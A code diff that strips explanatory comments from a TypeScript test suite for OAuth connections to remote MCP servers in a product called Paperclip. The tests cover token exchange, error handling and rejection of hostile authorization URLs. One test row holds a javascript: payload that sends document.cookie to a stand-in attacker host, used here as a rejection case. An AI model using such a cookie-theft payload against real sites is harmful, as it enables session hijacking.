@@ -159,11 +159,6 @@ function headerRecord(init: RequestInit | undefined): Record<string, string> {
   );
 }
 
-/**
- * A single fetch implementation standing in for an MCP server plus its
- * authorization server. Returns the request log so tests can assert on the exact
- * protocol parameters Paperclip sent (RFC 8707 `resource`, DCR metadata, PKCE).
- */
 function installMcpOAuthFixture(options: FixtureOptions = {}) {
   const auth = options.auth ?? "public";
   const requests: FixtureRequest[] = [];
@@ -233,8 +228,6 @@ function installMcpOAuthFixture(options: FixtureOptions = {}) {
       const requested = parsedBody as Record<string, unknown>;
       return jsonResponse({
         client_id: "fixture-dcr-client",
-        // A conforming server echoes back what it registered, and Paperclip
-        // requires its own callback even when the provider adds a routing URI.
         redirect_uris: [
           ...(requested.redirect_uris as string[]),
           ...(options.registrationExtraRedirectUris ?? []),
@@ -908,8 +901,6 @@ describeEmbeddedPostgres("generic remote MCP connections", () => {
       });
       const successfulCall = { decision: "allowed", result: { data: { content: [{ type: "text", text: "Authenticated MCP call succeeded" }] } } };
       await expect(call()).resolves.toMatchObject(successfulCall);
-      // The provider actually rejects its old access token. Expire Paperclip's
-      // cached timestamp too, without waiting an hour or mocking global time.
       for (let rotation = 0; rotation < 2; rotation += 1) {
         fixture.advanceTime(3_601_000);
         await expireFixtureCredentials(connectionId);
@@ -1823,7 +1814,6 @@ describeEmbeddedPostgres("generic remote MCP connections", () => {
       actor: { actorType: "user", actorId: "board-user" },
     }).then(() => null, (error: unknown) => error);
 
-    // Paperclip's own copy for `invalid_grant`, not a syllable of the provider's.
     expect(thrown).toMatchObject({
       status: 502,
       message: "The authorization server rejected the authorization code or refresh token.",
@@ -1862,8 +1852,6 @@ describeEmbeddedPostgres("generic remote MCP connections", () => {
       actor: { actorType: "user", actorId: "board-user" },
     }).then(() => null, (error: unknown) => error);
 
-    // Off the allowlist, so the label collapses and the message falls back to
-    // Paperclip's generic copy rather than naming the provider's code.
     expect(thrown).toMatchObject({
       status: 502,
       message: "OAuth token exchange failed",
@@ -2012,8 +2000,6 @@ describeEmbeddedPostgres("generic remote MCP connections", () => {
     const service = toolAccessService(db);
     await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture unsolicited denial" });
 
-    // An unsolicited callback carries no state Paperclip issued, so it is
-    // rejected on that ground and never reaches the provider-error branch.
     await expect(service.completeOAuthCallback({
       state: "state-paperclip-never-issued",
       error: "access_denied",
@@ -2068,8 +2054,6 @@ describeEmbeddedPostgres("generic remote MCP connections", () => {
       const state = new URL(start.authorizationUrl).searchParams.get("state")!;
       const code = fixture.issueAuthorizationCode(start.authorizationUrl);
 
-      // Real providers invent their own cancel codes. Whether or not Paperclip
-      // recognizes the label, the request is over.
       const thrown = await service.completeOAuthCallback({
         state,
         error: "user_cancelled_authorize",
@@ -2167,7 +2151,6 @@ describeEmbeddedPostgres("generic remote MCP connections", () => {
       expect(resolved).toMatchObject({ status: "rejected", resolvedByUserId: "board-user" });
       expect(resolved!.result).toMatchObject({ outcome: "rejected" });
       expect(resolved!.resolvedAt).not.toBeNull();
-      // The prompt's reason is Paperclip's own copy, never the provider's.
       expect(JSON.stringify(resolved!.result)).not.toContain("access_denied");
       await expect(db.select().from(toolOauthStates)).resolves.toHaveLength(0);
     });
@@ -2277,20 +2260,12 @@ describeEmbeddedPostgres("generic remote MCP connections", () => {
       actor: { actorType: "user", actorId: "board-user" },
     });
 
-    // The callback moved. Paperclip cannot re-register in the operator's console,
-    // so it must stop and say so rather than silently minting a new client.
     await expect(service.startOAuth(company.id, connected.connectionId, {
       redirectUri: "https://other.fixture.test/api/tools/oauth/callback",
       actor: { actorType: "user", actorId: "board-user" },
     })).rejects.toMatchObject({ details: { code: "oauth_manual_client_rebinding_required" } });
   });
 
-  /**
-   * PAP-17099 — the authorization endpoint is the one discovered value Paperclip
-   * hands to the operator's browser as a top-level navigation, so a hostile
-   * server must not be able to advertise a scheme that runs code in the board's
-   * origin, reads a local file, or downgrades the authorization request.
-   */
   describe("unsafe advertised authorization endpoints", () => {
     it.each([
       ["javascript:", "javascript:fetch('https://evil.test/'+document.cookie)"],
@@ -2321,8 +2296,6 @@ describeEmbeddedPostgres("generic remote MCP connections", () => {
       const service = toolAccessService(db);
 
       const connected = await service.connectGalleryApp(company.id, { link: MCP_URL, name: "Fixture poisoned config" });
-      // A row written before the gate existed (or by any other writer) is not
-      // trusted just because it is in Paperclip's own database.
       const poisonStoredAuthorizationUrl = async () => {
         const [row] = await db.select().from(toolConnections).where(eq(toolConnections.id, connected.connectionId));
         const poisoned = {
